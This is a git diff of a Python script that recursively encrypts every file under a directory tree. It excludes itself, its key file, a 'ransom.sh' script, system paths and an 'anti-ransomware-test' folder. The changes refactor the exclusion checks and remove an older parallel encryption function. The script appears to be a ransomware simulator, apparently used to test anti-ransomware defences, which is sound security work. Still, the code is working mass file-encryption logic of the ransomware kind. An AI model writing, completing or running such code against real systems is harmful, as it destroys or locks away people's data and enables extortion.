@@ -46,7 +46,8 @@ def encrypt_file(file_path, key, exclude_paths):
     """
     Encrypt a file using the provided encryption key, excluding specified paths.
     """
-    if any(os.path.abspath(file_path).startswith(exclude) for exclude in exclude_paths):
+    abs_file_path = os.path.abspath(file_path)
+    if any(abs_file_path.startswith(exclude) for exclude in exclude_paths):
         logging.debug(f"Excluded: {file_path}")
         return
     try:
@@ -64,10 +65,12 @@ def find_files_to_encrypt(root_dir, exclude_paths):
     Find files to encrypt in the specified root directory, excluding specified paths.
     """
     for root, dirs, files in os.walk(root_dir):
-        dirs[:] = [d for d in dirs if not any(os.path.join(root, d).startswith(exclude) for exclude in exclude_paths)]
+        abs_root = os.path.abspath(root)
+        dirs[:] = [d for d in dirs if not any(os.path.join(abs_root, d).startswith(exclude) for exclude in exclude_paths)]
         for file in files:
             file_path = os.path.join(root, file)
-            if not any(os.path.abspath(file_path).startswith(exclude) for exclude in exclude_paths):
+            abs_file_path = os.path.abspath(file_path)
+            if not any(abs_file_path.startswith(exclude) for exclude in exclude_paths):
                 yield file_path
 
 def handle_bus_error(signum, frame):
@@ -76,19 +79,6 @@ def handle_bus_error(signum, frame):
     """
     logging.error(f"Bus error (signal {signum}).")
     time.sleep(1)
-
-def encrypt_files(root_dir, key, exclude_paths):
-    """
-    Encrypt files in the specified root directory, excluding specified paths.
-    """
-    files = find_files_to_encrypt(root_dir, exclude_paths)
-    with ThreadPoolExecutor() as executor:
-        futures = {executor.submit(encrypt_file, file, key, exclude_paths): file for file in files}
-        for future in as_completed(futures):
-            try:
-                future.result()
-            except Exception as e:
-                logging.error(f"Error encrypting file: {e}")
 
 def encrypt_files_with_resource_checks(root_dir, key, exclude_paths, chunk_size=100):
     """
@@ -138,10 +128,13 @@ def main():
     script_dir = os.path.abspath(os.path.dirname(__file__))
     exclude_files = ["main.py", "encryption.key", "ransom.sh"]
     exclude_paths = {os.path.join(script_dir, file) for file in exclude_files}
+
+    # Determine the absolute path of the `anti-ransomware-test` directory relative to the script's location
+    relative_path_to_exclude = os.path.join(script_dir, "..", "anti-ransomware-test")
+    absolute_path_to_exclude = os.path.abspath(relative_path_to_exclude)
+    exclude_paths.add(absolute_path_to_exclude)
     
-    #"/usr", "/etc", "/var", "/opt", "/sbin", "/dev", "/proc", "/sys", "/venv", "/workspaces", "/.codespaces", "/vscode"
-    system_paths = ["/usr","/var", "/opt", "/dev", "/proc", "/sys", "/venv", "/workspaces", "/.codespaces", "/vscode", "/snap", "/boot", "/anti-ransomware-test"]
-    # Convert system_paths to absolute paths before updating exclude_paths
+    system_paths = ["/usr", "/var", "/opt", "/dev", "/proc", "/sys", "/venv", "/workspaces", "/.codespaces", "/vscode", "/snap", "/boot"]
     exclude_paths.update([os.path.abspath(path) for path in system_paths])
     
     logging.debug(f"Exclude paths: {exclude_paths}")
@@ -154,6 +147,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
